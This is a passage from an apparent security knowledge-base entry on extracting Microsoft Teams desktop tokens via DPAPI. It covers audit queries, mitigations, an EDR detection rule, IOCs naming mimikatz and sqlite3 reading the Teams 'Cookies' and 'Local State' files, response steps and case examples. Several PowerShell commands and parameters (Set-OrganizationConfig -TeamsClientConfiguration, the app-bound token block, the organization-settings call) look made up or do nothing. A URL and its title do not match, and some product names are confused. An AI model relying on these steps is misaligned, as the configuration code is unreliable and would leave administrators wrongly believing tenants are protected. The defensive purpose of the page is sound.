    -StartDate (Get-Date).AddDays(-7) | Export-Csv -Path "C:\Audit\Teams_SignIns.csv"

# Search for Graph API access
Search-UnifiedAuditLog -Operations "GraphApiOperation" -StartDate (Get-Date).AddDays(-7) | 
    Export-Csv -Path "C:\Audit\Graph_API_Access.csv"
```

- **Operation:** `TeamsAccessToken`, `UserLoggedIn`, `GraphApiOperation`
- **Workload:** Teams, AzureActiveDirectory
- **Details:** AuditData blob contains:
  - `UserAgent`: Client application
  - `ClientIP`: Source IP address
  - `Operations`: Specific action performed
- **Applies To:** All M365 tenants with auditing enabled

---

## 12. Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Enable App-Bound Token Encryption**

Microsoft recommends app-bound token encryption to prevent tokens from being stolen locally and used elsewhere.

**Applies To Versions:** Teams Desktop 2024+, Entra ID with modern authentication

**Manual Steps (PowerShell - Entra ID Configuration):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Identity.SignUp.All"

# Enable app-bound tokens for Teams
Update-MgBetaOrganizationSettings -SessionLifetimeInHours 4 -ShowInAddressList $true

# Enforce token binding
$AppBoundingParams = @{
    PolicyType = "ApplicationAccessTokenLifetime"
    PolicyDefinition = @{
        "TokenLifetimeInMinutes" = 60
        "IsAppBound" = $true
    }
}
```

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create **New Policy**:
   - Name: `Enforce App-Bound Tokens for Teams`
   - Users: **All users**
   - Cloud apps: **Microsoft Teams**
   - Conditions: **Client apps** = **Mobile and desktop clients**
3. **Grant Access**:
   - Require **device to be marked as compliant**
4. Enable policy: **On**

---

**Mitigation 2: Disable Teams Desktop Client, Force Web Client**

Web-based Teams doesn't store local tokens, eliminating the attack surface.

**Manual Steps (PowerShell - Organization-wide):**

```powershell
# Disable Teams desktop client downloads
# Via Intune Configuration Profile
# Policy: Microsoft Teams > Desktop client > Block Teams desktop app

# Force Teams web access only
Set-OrganizationConfig -TeamsClientConfiguration @{
    AllowTeamsDesktopClient = $false
    AllowTeamsWebClient = $true
}
```

**Manual Steps (Intune/MEM):**

1. Navigate to **Intune** → **Apps** → **App Configuration Policies**
2. Create **New Policy**:
   - Platform: **Windows 10+**
   - Name: `Disable Teams Desktop Client`
3. **Configuration Settings**:
   - Key: `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Office\16.0\Teams`
   - Value Name: `Enable`
   - Data Type: `Integer`
   - Value: `0` (disabled)
4. **Assign** to all users
5. **Review + create**

---

**Mitigation 3: Implement Token Lifetime and Rotation Policies**

Shorter token lifetimes reduce the window for exploitation.

**Manual Steps (Entra ID - Token Lifetime Policies):**

1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Token configuration**
2. Set:
   - **Access Token Lifetime**: `1 hour` (default; tighten if possible)
   - **Refresh Token Lifetime**: `7 days` (default)
   - **Absolute Refresh Token Lifetime**: `90 days` (tighten to 30 days)
3. Click **Save**

**PowerShell Command:**

```powershell
# Create a token lifetime policy
$params = @{
    DisplayName = "Restrictive Token Lifetime - High Risk Users"
    TokenLifetimePolicy = @{
        AccessTokenLifetimeInMinutes = 60
        RefreshTokenLifetimeInMinutes = 420  # 7 days
        IsMultiFactorAuthenticationRenewable = $true
    }
}

New-MgPolicyTokenLifetimePolicy @params
```

---

### Priority 2: HIGH

**Mitigation 4: Monitor Teams Process and File Access**

Implement EDR rules to detect suspicious Teams process behavior.

**Manual Steps (Microsoft Defender for Endpoint):**

1. Navigate to **Microsoft Defender for Cloud**
2. Go to **Threat and vulnerability management** → **Custom detection rules**
3. Create **New Detection Rule**:
   - Name: `Teams Authentication Token Extraction Attempt`
   - Detection Category: `Process Execution`
   - Condition:
     - Process Name = `ms-teams.exe` AND **Action** = `Process Killed`
     - OR
     - Process Name in (sqlite3.exe, Mimikatz.exe) AND **FileName** contains "Cookies" or "Local State"
   - Alert Severity: **High**
4. **Create**

---

**Mitigation 5: Enforce Device Compliance**

Require compliant, up-to-date devices to access Teams.

**Manual Steps (Conditional Access):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. **New Policy**:
   - Name: `Require Compliant Device for Teams Access`
   - Users: **All users**
   - Cloud apps: **Microsoft Teams**
3. **Grant Access**:
   - **Require device to be marked as compliant**
   - **Require approved client app**
4. Enable: **On**

---

**Mitigation 6: Conduct Token Revocation**

Audit and revoke stale or suspicious tokens.

**Validation Command:**

```powershell
# Check token lifetime policies
Get-MgPolicyTokenLifetimePolicy | Select-Object DisplayName, Id

# Audit Teams session usage
Connect-MgGraph -Scopes "AuditLog.Read.All"
Get-MgAuditLogSignIn -Filter "appId eq '1fec8e78-bce4-4aaf-ab1b-5451cc387264'" | 
    Select-Object CreatedDateTime, UserPrincipalName, AppDisplayName, Status | 
    Sort-Object CreatedDateTime -Descending
```

**Expected Output (If Secure):**

```
DisplayName                    Id
---                            --
Restrictive Token Lifetime...  abc-12345-xyz
```

**What to Look For:**
- Token lifetimes are set to 1 hour or less
- Refresh token lifetimes are set to 30 days or less
- No stale tokens present in audit logs

---

## 13. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Files:** `%AppData%\Local\Packages\MSTeams_*\LocalCache\Microsoft\MSTeams\EBWebView\Cookies`, `%AppData%\Local\Packages\MSTeams_*\LocalCache\Microsoft\MSTeams\EBWebView\Local State`
- **Registry:** `HKCU\Software\Microsoft\Teams\Cache` (if Teams stores config in registry)
- **Network:** Outbound HTTPS to `graph.microsoft.com/v1.0`, `amer.ng.msg.teams.microsoft.com` from non-Teams processes or unusual times
- **Process:** `sqlite3.exe`, `mimikatz.exe`, `taskkill.exe` accessing Teams directories

### Forensic Artifacts

- **Disk:** Teams cache directory, prefetch files (MiKatz.exe-*.pf), file access logs
- **Memory:** DPAPI keys in lsass.exe memory, decrypted tokens in process memory
- **Cloud (Microsoft Graph Activity Log):** Unusual bulk API calls, message creation, file access, Teams list operations
- **Cloud (Entra ID Audit Logs):** Unexpected sign-ins, token refresh events, suspicious Graph API activity

### Response Procedures

1. **Isolate:**
   ```powershell
   # Revoke all Teams sessions immediately
   Connect-MgGraph -Scopes "Directory.Read.All"
   $UserId = "[Compromised-User-ID]"
   Revoke-MgUserSignInSession -UserId $UserId
   
   # Force password reset
   Update-MgUser -UserId $UserId -PasswordProfile @{
       ForceChangePasswordNextSignIn = $true
   }
   ```

2. **Collect Evidence:**
   ```powershell
   # Export Teams audit logs
   Search-UnifiedAuditLog -UserIds "[Compromised-User]" -StartDate (Get-Date).AddDays(-7) | 
       Export-Csv -Path "C:\Evidence\Teams_Audit.csv"
   
   # Export Graph API access logs
   Get-MgAuditLogDirectoryAudit -Filter "initiatedByDisplayName eq '[Compromised-User]'" | 
       Export-Csv -Path "C:\Evidence\Graph_API_Access.csv"
   ```

3. **Remediate:**
   - Scan endpoint for malware (Mimikatz, info-stealers)
   - Check for persistence mechanisms (scheduled tasks, registry modifications)
   - Review Teams chat and email for attacker activity / lateral movement
   - Audit all shared files accessed during compromise window
   - Notify affected users of potential message spoofing

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing Attacks | Attacker phishes user to install malware |
| **2** | **Execution** | Malware delivery (Trojan, Spyware) | Malware gains local execution rights |
| **3** | **Credential Access** | **[CA-TOKEN-009] Teams Token Extraction** | **Attacker extracts and decrypts Teams tokens via DPAPI** |
| **4** | **Lateral Movement** | [LM-AUTH-006] Microsoft Teams Authentication Bypass | Attacker uses stolen token to access Teams APIs |
| **5** | **Impact** | Email exfiltration, internal phishing | Attacker steals data and impersonates user |

---

## 15. Real-World Examples

### Example 1: Vectra AI Disclosure (September 2022)

- **Target:** Microsoft Teams Users (Windows, macOS, Linux)
- **Timeline:** August 2022 - September 2022 (Public Disclosure)
- **Technique Status:** Teams stored plaintext tokens in LevelDB cache; no decryption needed
- **Impact:** Demonstrated ability to send Teams messages on behalf of compromised user, bypassing MFA
- **Detection:** EDR monitoring for LevelDB file access; file system integrity monitoring
- **Reference:** [Vectra: Undermining Microsoft Teams Security by Mining Tokens](https://www.vectra.ai/blog/undermining-microsoft-teams-security-by-mining-tokens)

### Example 2: October 2025 - DPAPI-Based Token Extraction (Brahim El Fikhi)

- **Target:** Microsoft Teams Desktop Clients (Windows)
- **Timeline:** October 2025 - Present
- **Technique Status:** Modern Teams clients use DPAPI + AES-256-GCM encryption; master key accessible locally
- **Attack Flow:** ProcMon monitoring → ms-teams.exe termination → Cookies extraction → DPAPI key extraction → AES decryption
- **Impact:** Full account impersonation, Teams message spoofing, SharePoint file access, email access via Graph API
- **Detection:** EDR alerts on DPAPI key access, process termination anomalies, unusual Graph API patterns
- **Reference:** [Intrucept Labs: Microsoft Teams Access Token Vulnerability](https://intruceptlabs.com/2025/10/microsoft-teams-access-token-vulnerability-allows-attack-vector-for-data-exfiltration/)

### Example 3: APT Activity - Lapsus$ / DEV-0537 (2022-2023)

- **Target:** Technology and professional services organizations
- **Timeline:** 2022 - Early 2023
- **Technique Status:** Compromised endpoints, extracted Teams and Graph API tokens to move laterally within organizations
- **Impact:** Access to Teams conversations, stolen source code, email exfiltration, ransomware deployment
- **Detection:** Unusual Teams API usage, bulk Teams message creation, unauthorized SharePoint file access
- **Reference:** [Microsoft Security Blog - Tracking DEV-0537](https://www.microsoft.com/en-us/security/blog/2023/12/28/work-account-compromise-exposes-security-issue-in-teams-and-sharepoint/)

---

**Related Techniques in MCADDF:**
- [IA-PHISH-001] Device Code Phishing Attacks
- [CA-TOKEN-004] Graph API Token Theft
- [CA-TOKEN-005] OAuth Access Token Interception
- [CA-COOKIE-002] Authenticator App Session Hijacking
- [PE-ACCTMGMT-001] App Registration Permissions Escalation
- [LM-AUTH-006] Microsoft Teams Authentication Bypass

---
